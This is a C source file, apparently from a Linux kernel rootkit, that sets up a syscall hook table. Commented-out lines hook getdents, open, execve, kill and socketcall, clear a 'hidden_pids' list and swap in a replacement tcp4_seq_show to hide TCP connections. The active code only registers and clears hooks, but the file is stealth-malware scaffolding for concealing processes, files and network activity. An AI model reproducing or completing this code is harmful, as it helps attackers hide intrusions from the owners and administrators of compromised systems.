#include "hooktable.h"


/* main hook init */
void init_hook_table(void)
{
    
    int i;

    /* clear table */
    for (i = 0; i < NR_syscalls; i ++)
        hook_table[i] = NULL;
    
    /* init hooks */
    /*
    hook_table[__NR_getdents64]     = (void *)hook_getdents64;
    hook_table[__NR_getdents]       = (void *)hook_getdents32;
    hook_table[__NR_chdir]          = (void *)hook_chdir;
    hook_table[__NR_open]           = (void *)hook_open;
    hook_table[__NR_execve]         = (void *)hook_execve;
    hook_table[__NR_socketcall]     = (void *)hook_socketcall;
    hook_table[__NR_fork]           = (void *)hook_fork;
    hook_table[__NR_exit]           = (void *)hook_exit;
    hook_table[__NR_kill]           = (void *)hook_kill;
    hook_table[__NR_getpriority]    = (void *)hook_getpriority;
    */
    /* example hook */
    //hook_table[__NR_exit]         = (void *)hook_example_exit;
    
    /* any additional (non-syscall) hooks go here */

    /* clear Daniel's hidden_pids */
    //memset(hidden_pids, 0, sizeof(hidden_pids));

    /* Daniel Palacio's tcp hook */
    //#ifdef __NET_NET_NAMESPACE_H
    //    proc_net = init_net.proc_net;
    //#endif

    //if(proc_net == NULL)
    //    return;

    //tcp = proc_net->subdir->next;
    //while (strcmp(tcp->name, "tcp") && (tcp != proc_net->subdir))
    //    tcp = tcp->next;

    //if (tcp != proc_net->subdir)
    //{
    //    original_tcp4_seq_show = ((struct tcp_seq_afinfo *)(tcp->data))->seq_show;
    //    ((struct tcp_seq_afinfo *)(tcp->data))->seq_show = hook_tcp4_seq_show;
    //}
}


/* main hook uninit */
void uninit_hook_table(void)
{
    /* unload any additional non-syscall hooks here */
 
    /* un-do Daniel's tcp hook */
    //tcp = proc_net->subdir->next;

    /*  tcp4_seq_show() with original */
    //while (strcmp(tcp->name, "tcp") && (tcp != proc_net->subdir))
    //    tcp = tcp->next;

    //if (tcp != proc_net->subdir)
    //    ((struct tcp_seq_afinfo *)(tcp->data))->seq_show = original_tcp4_seq_show;

    int i;

    /* clear table */
    for (i = 0; i < NR_syscalls; i ++)
        hook_table[i] = NULL;

    return;
}

/*
 * TODO: locking
 */
void register_hook(int scn, void *p)
{
    if((scn >= 0) && (scn < NR_syscalls) && (!hook_table[scn]))
        hook_table[scn] = p;
}

void unregister_hook(int scn)
{
    if((scn >= 0) && (scn < NR_syscalls))
        hook_table[scn] = NULL;
}

